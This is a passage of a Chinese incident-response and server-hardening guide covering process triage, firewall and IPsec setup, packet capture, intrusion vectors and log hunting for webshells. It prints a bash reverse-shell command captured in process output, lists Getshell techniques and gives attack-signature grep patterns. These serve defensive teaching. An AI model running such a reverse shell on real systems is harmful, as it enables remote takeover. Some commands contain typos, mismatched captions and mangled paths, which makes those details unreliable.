【查看ssh配置文件和/usr/sbin/sshd的时间】
stat /usr/sbin/sshd

【通过strace监控sshd进程读写（密码）文件的操作】
# ps axu | grep sshd | grep -v grep
root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd
# strace -o aa -ff -p 65530
# grep open aa* | grep -v -e No -e null -e denied| grep WR
aa.102586:open(&quot;/tmp/ilog&quot;, O_WRONLY|O_CREAT|O_APPEND, 0666) = 4

进程部分：
【资源占用】
top
【启动时间】
可疑与前面找到的Webshell时间点比对。
【启动权限】
这点很重要，比如某次应急中发现木马进程都是mysql权限执行的，如下所示：
mysql 63763 45.3 0.0 12284 9616 ? R 01:18 470:54 ./db_temp/dazui.4
mysql 63765 0.0 0.0 12284 9616 ? S 01:18 0:01 ./db_temp/dazui.4
mysql 63766 0.0 0.0 12284 9616 ? S 01:18 0:37 ./db_temp/dazui.4
mysql 64100 45.2 0.0 12284 9616 ? R 01:20 469:07 ./db_temp/dazui.4
mysql 64101 0.0 0.0 12284 9616 ? S 01:20 0:01 ./db_temp/dazui.4
那基本可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。
【父进程】
例如我在菜刀中反弹Bash
[root@server120 html]# ps -ef | grep '/dev/tcp' | grep -v grep
apache 26641 1014 0 14:59 ? 00:00:00 sh -c /bin/sh -c &quot;cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.192.144/2345 0&amp;gt;&amp;amp;1;echo [S];pwd;echo [E]&quot; 2&amp;gt;&amp;amp;1
父进程进程号1014
[root@server120 html]# ps -ef | grep 1014
apache 1014 1011 0 Sep19 ? 00:00:00 /usr/sbin/httpd
可以看到父进程为apache，就可以判断攻击者通过Web入侵。
获取到可疑进程号之后，可疑使用lsof -p pid查看相关文件和路径。
例如之前遇到的十字病毒，会修改ps和netstat显示的进程名称
udp 0 0 0.0.0.0:49937 0.0.0.0:* 131683/ls -la 
udp 0 0 0.0.0.0:47584 0.0.0.0:* 116515/ifconfig
使用lsof -p pid可以看到可执行文件
[root@DataNode105 admin]# lsof -p 131683
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
hahidjqzx 131683 root cwd DIR 8,98 4096 18087937 /root
hahidjqzx 131683 root rtd DIR 8,98 4096 2 /
hahidjqzx 131683 root txt REG 8,98 625622 24123895 /usr/bin/hahidjqzxs
【获取文件类型】
可以文件类型可以使用file获取；


awk '{print $1}' access.log |sort|uniq -c|sort -nr|head -10【获取频率前10的ip】
netstat -nat | grep &quot;192.168.1.15:1234&quot; |awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -20【查看连接某服务端口最多的的IP地址】


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;安全加固&quot;&gt;安全加固&lt;/h4&gt;

&lt;h5 id=&quot;常规应急处理&quot;&gt;常规应急处理&lt;/h5&gt;

&lt;p&gt;杀死进程，kill -9 xxx
删除木马，拷贝正常命令【或者找原来的备份】，删除开机启动项。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
rm: cannot remove `abcfg': Operation not permitted
[root[@ceshi1](/user/ceshi1) tomcat]# lsattr abcfg
----i--------e- abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# chattr -i abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
--------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;屏蔽IP&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -A INPUT -i eth0 -s *.*.*.0/24 -j DROP
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;windows系统篇&quot;&gt;WINDOWS系统篇&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.1.1 禁用/停止服务
C:&amp;gt; sc query
C:&amp;gt; sc config &quot;服务名&quot; start= disabled
C:&amp;gt; sc stop &quot;服务名&quot;
C:&amp;gt; wmic service where name=&quot;服务名&quot; call ChangeStartmode Disabled
1.1.2 防火墙管理
列出所有规则:
C:&amp;gt; netsh advfirewall firewall show rule name=all
启用或禁用防火墙:
C:&amp;gt; netsh advfirewall set currentprofile state on
C:&amp;gt; netsh advfirewall set currentprofile firewallpolicy blockinboundalways,allowoutbound
C:&amp;gt; netsh advfirewall set publicprofile state on
C:&amp;gt; netsh advfirewall set privateprofile state on
C:&amp;gt; netsh advfirewall set domainprofile state on
C:&amp;gt; netsh advfirewall set allprofile state on
C:&amp;gt; netsh advfirewall set allprof ile state off
配置举例：
netsh advfirewall firewall add rule name=&quot;开放TCP:80端口&quot; dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name=&quot;开放TCP:443端口&quot; dir=in action=allow protocol=TCP localport=443
netsh advfirewall firewall add rule name=&quot;屏蔽TCP:445端口&quot; dir=in action=block protocol=TCP localport=445
netsh advfirewall firewall add rule name=&quot;允许MyApp&quot; dir=in action=allow program=&quot;C:MyAppMyApp.exe&quot; enable=yes
1.1.3 清除DNS缓存和Netios缓存
C:&amp;gt; ipconfig /flushdns
C:&amp;gt; nbtstat -R
1.1.4 应用控制
AppLocker配置
导入Applocker模块
PS C:&amp;gt; import-module Applocker
查看system32目录下所有exe文件的Applocker信息
PS C:&amp;gt; Get-ApplockerFileinformation -Directory C:WindowsSystem32 -Recurse -FileType Exe
 增加一条针对system32目录下所有的exe文件的允许规则
PS C:&amp;gt; Get-Childitem C:WindowsSystem32*,exe | Get-ApplockerFileinformation | New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32
1.1.5 IPSEC
1.）使用预共享密钥的方式新建一条IPSEC本地安全策略，应用到所有连接和协议
C:&amp;gt; netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY
C:&amp;gt; netsh ipsec static add filteraction name=MyIPsecAction action=negotiate 
C:&amp;gt; netsh ipsec static add policy name=MyIPsecPolicy assign=yes
C:&amp;gt; netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all  activate=yes psk=密码
2.）新建一条允许访问外网TCP 80和443端口的IPSEC策略
C:&amp;gt; netsh ipsec static add filteraction name=Allow action=permit
C:&amp;gt; netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=80
C:&amp;gt; netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=443
C:&amp;gt; netsh ipsec static add rule name=WebAllow policy=MyIPsecPolicy filterlist=WebFilter filteraction=Allow conntype=all activate=yes psk=密码
3.）查看和禁用某条IPSEC本地安全策略
C:&amp;gt; netsh ipsec static show policy name=MyIPsecPolicy
C:&amp;gt; netsh ipsec static set policy name=MyIPsecPolicy assign=no
新建一条IPSEC对应的防火墙规则，源地址和目的地址为any
C:&amp;gt; netsh advfirewall consec add rule name=&quot;IPSEC&quot; endpointl=any endpoint2=any action=requireinrequireout qmsecmethods=default
新建一条IPSEC对应的防火墙规则，所有出站请求必须提供预共享密钥
C:&amp;gt; netsh advfirewall firewall add rule name=&quot;IPSEC_Out&quot; dir=out action=allow enable=yes profile=any localip=any remoteip=any protocol=any  interfacetype=any security=authenticate
1.1.6 其他安全策略
禁用远程桌面连接
C:&amp;gt; reg add &quot;HKLMSYSTEMCurrentControlSetControlTerminalServer&quot; /f /v fDenyTSConnections /t REG_DWORD /d 1
只发送NTLMv2响应（防止&quot;永恒之蓝&quot;漏洞攻击）
C:&amp;gt; reg add HKLMSYSTEMCurrentControlSetControlLsa /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
禁用IPV6
C:&amp;gt; reg add HKLMSYSTEMCurrentControlSetservicesTCPIP6Parameters /v DisabledComponents /t REG_DWORD /d 255 /f
禁用sticky键
C:&amp;gt; reg add &quot;HKCUControlPanelAccessibilityStickyKeys&quot; /v Flags /t REG_SZ /d 506 /f
禁用管理共享（Servers/Workstations）
C:&amp;gt; reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareServer /t REG_DWORD /d 0
C:&amp;gt; reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareWks /t REG_DWORD /d 0
禁用注册表编辑器和CMD命令提示符
C:&amp;gt; reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableRegistryTools /t REG_DWORD /d 1 /f
C:&amp;gt; reg add HKCUSoftwarePoliciesMicrosoftWindowsSystem /v DisableCMD /t REG_DWORD /d 1 /f
启用UAC
C:&amp;gt; reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem /v EnableLUA /t REG_DWORD /d 1 /f
启用防火墙日志
C:&amp;gt; netsh firewall set logging droppedpackets = enable 
C:&amp;gt; netsh firewall set logging connections = enable
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;linux系统篇&quot;&gt;LINUX系统篇&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.2.1 服务管理
查看服务状态
service --status-all
ps -ef OR ps -aux
initctl list
systemctl list-unit-files
启动，停止和禁用服务
For Upstart services:
/etc/init.d/apache2 start | stop | status
service apache2 start | stop | status
update-rc.d apache2 disable
For Systemd services:
systemctl start | stop | status ntp.service
systemctl disable sshd.service
1.2.2 防火墙管理
iptables 常用操作：
iptables-save &amp;gt; filewall_rules.bak # 导出当前规则
iptables -vnL --line # 列出所有规则
iptables -S # 同上
iptables -P INPUT DROP # 默认策略，禁止所有连接
iptables -A INPUT -s 10.10.10.10 -j DROP # 禁止单个IP
iptables -A INPUT -s 10,10.10.0/24 -j DROP # 禁止一个网段
iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP # 禁止某IP访问本机SSH服务
iptables -A INPUT -p tcp --dport ssh -j DROP # 禁止访问本机SSH服务
iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix &quot;
iptables denied: &quot; --log-level 7 # 启用日志
iptables -F # 清除所有已加载的工作
1.2.3 DNS缓存
Unix/Linux系统没有系统级别DNS缓存
1.2.4 配置IPSEC
在两台服务器之间建立IPSEC通道
1.）添加防火墙规则允许IPSEC协议
iptables -A INPUT -p esp -j ACCEPT
iptables -A INPUT -p ah -j ACCEPT
iptables -A INPUT -p udp --dport 500 -j ACCEPT
iptables -A INPUT -p udp --dport 4500 -j ACCEPT
安装Racoon
apt -y install racoon
2.）编辑配置文件：/etc/ipsec-tools.conf
flush;
spdflush;
spdadd 主机A的IP地址 主机B的IP地址 any -P out ipsec
 esp/transport//require;
spdadd 主机B的IP地址 主机A的IP地址 any -P in ipsec
 esp/transport//require;
3.）编辑配置文件：/etc/racoon/racoon.conf
log notify;
path pre_shared_key &quot;/etc/racoon/psk.txt&quot;;
path certificate &quot;/etc/racoon/certs&quot;;
remote anonymous {
 exchange_mode main,aggressive;proposal {    encryption_algorithm aes_256;    hash_algorithm sha256;    authentication_method
pre_shared_key;
     dh_group modp1024;
}
 generate_policy off;
}
sainfo anonymous{
 pfs_group 2;encryption_algorithm aes_256;authentication_algorithm hmac_sha256;compression_algorithm deflate;
}   
4.）添加预共享密钥
主机A：echo 主机B 123 &amp;gt;&amp;gt; /etc/racoon/psk.txt
主机B：echo 主机A 123 &amp;gt;&amp;gt; /etc/racoon/psk.txt
5.）重启服务，检查协商及配置策略
service setkey restart
setkey -D
setkey -DP
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;给目录和容器改权限&quot;&gt;给目录和容器改权限&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/yuanqiao/p/4816843.html&quot;&gt;apache禁止访问文件或目录执行权限、禁止运行脚本PHP文件的设置方法&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/anxinliu2011/article/details/&quot;&gt;Tomcat用户权限设置&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在ubuntu 安装完apache 之后，默认会往系统中增加www-data 用户 和 www-data 用户组。
同样你可以用 ps -ef | grep apache 查看 apache 进程，你会发现apache的。&lt;/p&gt;

&lt;p&gt;这样你就可以理解为这个apache服务器运行的用户和用户组是www-data,假设网站的用户为demo,项目的目录为/var/www/html/demo&lt;/p&gt;

&lt;p&gt;接下来就分几个步骤来设置(用root用户执行下面的命令)：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.首先把网站的的目录和文件的所有者设置为demo,所属组设置为www-data ，对与Linux命令不熟悉的，可以到网上查询。

chown -R demo:www-data /var/www/html/demo
2.设置网站目录权限为750，750是demo这个用户对目录拥有读写执行的权限，这样demo用户可以在任何目录下创建文件，用户组有有读执行权限，这样就有进入目录的权限，其它用户没有任何权限。

chmod 750 /var/www/html/demo
cd  /var/www/html/demo
find -type d -exec chmod 750 {} \;
3.设置网站文件权限为640，640指只有demo用户对网站文件有更改的权限，apache服务器只有读取文件的权限，无法更改文件，其它用户无任何权限。

find -not -type d -exec chmod 640 {} \;
4.需要针对个别目录来设置权限，以Thinkphp为例，它的Runtime 目录存储的有日志文件，还有与数据库做ORM映射的数据库表信息，这说明apache服务器要对这些目录

有访问的权限，并且对于线面的日志文件有写入的权限，那么这样就需要对于这些特殊目录设置。

cd /var/www/html/demo
find . -name &quot;Runtime&quot; -type d -exec chmod -R 770 {} \;
执行上面的命令请注意 “{}”与 “\”之间是有空格的，上面的-R参数是递归给Runtime 目录下面的目录和文件赋予 770 权限，当然了你会说日志文件是不需要执行权限的，

不过这里没关系，当你把日志文件删除掉之后，生成出来的文件是没执行权限的。因为当你把日志文件删除掉之后，那么生成日志文件的的用户和所有者都是www-data。

这样整个站点你就可以通过这种方式管理起来了。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;简单的抓包命令&quot;&gt;简单的抓包命令&lt;/h4&gt;

&lt;p&gt;抓取所有经过 eth2 目的或源地址是 192.168.1.2 的网络数据 ，并且保存到XX.pcap文件中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump   -i  eth2 host 192.168.1.2    -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓取所有经过 eth2，目的地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓取所有经过 eth1，源地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓取网口1 源端口是25的数据，保存到xx.pcap中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tcpdump -i eth1 src port 25  -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓取网口1 目的端口是25的数据，保存到xx.pcap中&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tcpdump -i eth1 dst port 25  -w   xx.pcap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓整个包：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#tcpdump -X -s 0 host 192.168.1.12
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;抓68字节：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#tcpdump -X host 192.168.1.12
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;对应的端口抓包：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#tcpdump -X udp port 1812
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;wireshak工具抓包：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wireshak工具抓包
tcp.port == 6789

过滤源ip、目的ip。在wireshark的过滤规则框Filter中输入过滤条件。如查找目的地址为192.168.101.8的包，ip.dst==192.168.101.8；查找源地址为ip.src==1.1.1.1；

使用wireshark常用的过滤命令
端口过滤。如过滤80端口，在Filter中输入，tcp.port==80，这条规则是把源端口和目的端口为80的都过滤出来。使用tcp.dstport==80只过滤目的端口为80的，tcp.srcport==80只过滤源端口为80的包；

使用wireshark常用的过滤命令
协议过滤比较简单，直接在Filter框中直接输入协议名即可，如过滤HTTP的协议；

使用wireshark常用的过滤命令
http模式过滤。如过滤get包，http.request.method==&quot;GET&quot;,过滤post包，http.request.method==&quot;POST&quot;；

使用wireshark常用的过滤命令
连接符and的使用。过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，ip.src==192.168.101.8 and http。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;pcap文件过滤和合并：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;通过 editcap， 我们能以很多不同的规则来过滤 pcap 文件中的内容，并且将过滤结果保存到新文件中。

首先，以“起止时间”来过滤 pcap 文件。 &quot; - A &amp;lt; start-time &amp;gt; 和 &quot; - B &amp;lt; end-time &amp;gt; 选项可以过滤出在这个时间段到达的数据包（如，从 2:30 ～ 2:35）。时间的格式为 “ YYYY-MM-DD HH:MM:SS&quot;。

$ editcap -A '2014-12-10 10:11:01'-B '2014-12-10 10:21:01' input.pcap output.pcap
也可以从某个文件中提取指定的 N 个包。下面的命令行从 input.pcap 文件中提取100个包（从 401 到 500）并将它们保存到 output.pcap 中：

$ editcap input.pcap output.pcap 401-500
使用 &quot;-D &amp;lt; dup-window &amp;gt;&quot; （dup-window可以看成是对比的窗口大小，仅与此范围内的包进行对比）选项可以提取出重复包。每个包都依次与它之前的 &amp;lt; dup-window &amp;gt; -1 个包对比长度与MD5值，如果有匹配的则丢弃。

$ editcap -D 10 input.pcap output.pcap
遍历了 37568 个包, 在 10 窗口内重复的包仅有一个，并丢弃。

也可以将 &amp;lt; dup-window &amp;gt; 定义成时间间隔。使用&quot;-w &amp;lt; dup-time-window &amp;gt;&quot;选项，对比&amp;lt; dup-time-window &amp;gt; 时间内到达的包。

$ editcap -w 0.5 input.pcap output.pcap
检索了 50000 个包, 以0.5s作为重复窗口，未找到重复包。

分割 pcap 文件
当需要将一个大的 pcap 文件分割成多个小文件时，editcap 也能起很大的作用。

将一个 pcap 文件分割成数据包数目相同的多个文件

$ editcap -c &amp;lt;packets-per-file&amp;gt;&amp;lt;input-pcap-file&amp;gt;&amp;lt;output-prefix&amp;gt;
输出的每个文件有相同的包数量，以 &amp;lt; output-prefix &amp;gt;-NNNN的形式命名。

以时间间隔分割 pcap 文件

$ editcap -i &amp;lt;seconds-per-file&amp;gt;&amp;lt;input-pcap-file&amp;gt;&amp;lt;output-prefix&amp;gt;
合并 pcap 文件
如果想要将多个文件合并成一个，用 mergecap 就很方便。

当合并多个文件时，mergecap 默认将内部的数据包以时间先后来排序。

$ mergecap -w output.pcap input.pcap input2.pcap [input3.pcap ...]
如果要忽略时间戳，仅仅想以命令行中的顺序来合并文件，那么使用 -a 选项即可。

例如，下列命令会将 input.pcap 文件的内容写入到 output.pcap, 并且将 input2.pcap 的内容追加在后面。

$ mergecap -a -w output.pcap input.pcap input2.pcap
总结
在这篇指导中，我演示了多个 editcap、 mergecap 操作 pcap 文件的例子。除此之外，还有其它的相关工具，如 reordercap用于将数据包重新排序，text2pcap 用于将 pcap 文件转换为文本格式， pcap-diff用于比较 pcap 文件的异同，等等。当进行网络入侵测试及解决网络问题时，这些工具与包注入工具非常实用，所以最好了解他们.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;入侵方式分析&quot;&gt;入侵方式分析&lt;/h3&gt;

&lt;p&gt;滚雪球式线性拓展&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;常见的入侵方式Getshell方法&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a) WEB入侵
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;滚雪球式线性拓展&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a) 密码口令类拓展（远控）

b) 典型漏洞批量利用
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;常见的入侵方式Getshell方法&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a) WEB入侵
i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell
ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞
b) 系统入侵
i. SSH 破解后登录操作
ii. RDP 破解后登录操作
iii. MSSQL破解后远控操作
iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）
c) 典型应用

i. Mail暴力破解后信息挖掘及漏洞利用
ii. VPN暴力破解后绕过边界
iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行
iv. Rsync 未授权访问类
v. Mongodb未授权访问类
vi. Elasticsearch命令执行漏洞
vii. Memcache未授权访问漏洞
viii. 服务相关口令（mysql ldap zebra squid vnc smb）
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;应急大致流程&quot;&gt;应急大致流程&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;询问（问：1.当前情况。主要是问当前发现了哪些异常；2.服务器组件部署情况；3.是否处于内网环境？是否还有其他关联服务器？4.如果当前服务器上部署了web应用还需要问这个项目是否经过安全测试？）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;事件处理
需要依据对项目组询问的结果进行排查，心里大概列出攻击者可能通过哪几条路进来并且在心里进行排序。这块的依据是基础知识那块的第二点，能不能快速的找到问题取决于你是否了解常见的攻击套路。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;初步对事件进行判断，是否需要关停业务或者是否需要隔离被攻击主机，是否需要对被攻击主机进行断网等等，防止损失/危害进一步扩大。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;建讨论组。拉相关人员进组方便沟通交流（一般包括：项目组运维、开发、领导、我方的事件处理人员、领导）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;依据上一步的排序结果进行对应日志调取，需要注意的是：日志不要在线上服务器进行分析，将线上日志打包下载回本地。不要在线上服务器进行任何多余的操作，操作的时候要小心小心再小心。可以让项目组的韵味取日志之后再发给你。对日志进行分析（考虑到我们这边项目的特征一般采用Linux下shell分析的方式，对于windows自带的事件日志一般采用splunk或者windows自带的日志分析工具或者log parser）比如通过询问了解到这台被黑的服务器用到了tomcat并且manager也存在弱口令，那么你首先需要调取的就是tomcat的日志，因为tomcat manager的入侵是需要上传war包，所以你的语句应该是：
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat log.log | grep -i &quot;.war&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;如果上一步骤中你找到了异常的war包（看文件名看上传时间）那么需要在服务器中找到这个war包下载到本地进行分析（主要分析是否是恶意的war包，如果是他的主要作用是什么）依据war包第一次上传的时间为准通过日志整理出攻击者的攻击时间线，依据时间线进行整体的入侵行为分析。分析攻击者在这个时间段内做了什么。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;如果被黑服务器处在内网还需要对内网其他服务器进行分析，是否存在被黑的情况，重点关注和被黑服务器共享同一密码的服务器。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;如果服务器中存在恶意的二进制文件，需要对二进制文件进行分析。使用IDA Pro对恶意文件进行静态分析，使用在线文件分析平台（金山火眼、文件B超、virustotal等等）对恶意文件进行动态分析。结合两者的分析结果判定恶意文件的行为，例如是否会对服务器系统文件进行替换？是否感染了系统其他关键文件？是否将自身写入开机启动项？同时可以将恶意文件的md5值放到网上搜索看看有没有人已经对该恶意文件进行过分析。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;确定此次事件的影响大小。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;报告&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;基本应急建议&quot;&gt;基本应急建议&lt;/h3&gt;

&lt;p&gt;Kill恶意进程：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;32位用wsyscheck，从自启动、服务里找，最重要的是杀白金这类注入进程的需要他的卸载模块功能，你kill进程立即重启。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;64位任务管理器加注册表编辑器足够了，右键转至服务非常好用，除了挖矿的，其他的木马后门都会*32，直接kill，kill不了的注册表里改了然后重启。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;WEBSHELL寻找：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;1）扫描特征
通常日志中会伴随一些其他攻击特征，例如可以用如下语句
egrep ‘(select|script|acunetix|sqlmap)’ /var/log/httpd/access_log&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;2）访问频次
重点关注POST请求
grep ‘POST’ /var/log/httpd/access_log | awk ‘{print $1}’ | sort | uniq -c | sort -nr&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;3）Content-Length
Content-Length过大的请求，例如过滤Content-Length大于5M的日志
awk ‘{if($10&amp;gt;5000000){print $0}}’ /var/log/httpd/access_log&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;注意
这里如果发现文件，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，而对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;基本建议：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;C:\Users\XXX\Desktop 新建用户的桌面，可能会有残留文件
查看杀毒软件日志
查看安全性日志，是否存在大量审核失败的日志（暴力破解）若该帐号本身已被删除，则”用户”处将不会显示帐号名，而是显示一串帐号的SID值。
查看安全性日志，特殊事件，比如说648特殊事件为创建账户事件&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这里列举一些有关检测时常见的事件ID:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;事件ID：517     审核日志已经清除
事件ID：528     登陆成功                      可以显示客户端连接ip地址
事件ID：529   登录失败。试图使用未知的用户名或已知用户名但错误密码进行登录
事件ID：683     会话从 winstation 中断连接     可以查看客户端计算机名
事件ID：624     创建了用户帐户
事件ID：626     启用了用户帐户
事件ID：627     用户密码已更改
事件ID：628     设置了用户密码
事件ID：630   用户帐户已删除。
事件ID：632： 成员已添加至全局组
事件ID：635： 已新建本地组。 
事件ID：643： 域策略已修改。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;必要时配置下history&lt;/p&gt;

&lt;p&gt;1、命令历史记录中加时间&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;默认情况下如下图所示，没有命令执行时间，不利于审计分析。

通过设置export HISTTIMEFORMAT='%F %T '，让历史记录中带上命令执行时间。

注意”%T”和后面的”’”之间有空格，不然查看历史记录的时候，时间和命令之间没有分割。

要一劳永逸，这个配置可以写在/etc/profile中，当然如果要对指定用户做配置，这个配置可以写在/home/$USER/.bash_profile中。

本文将以/etc/profile为例进行演示。

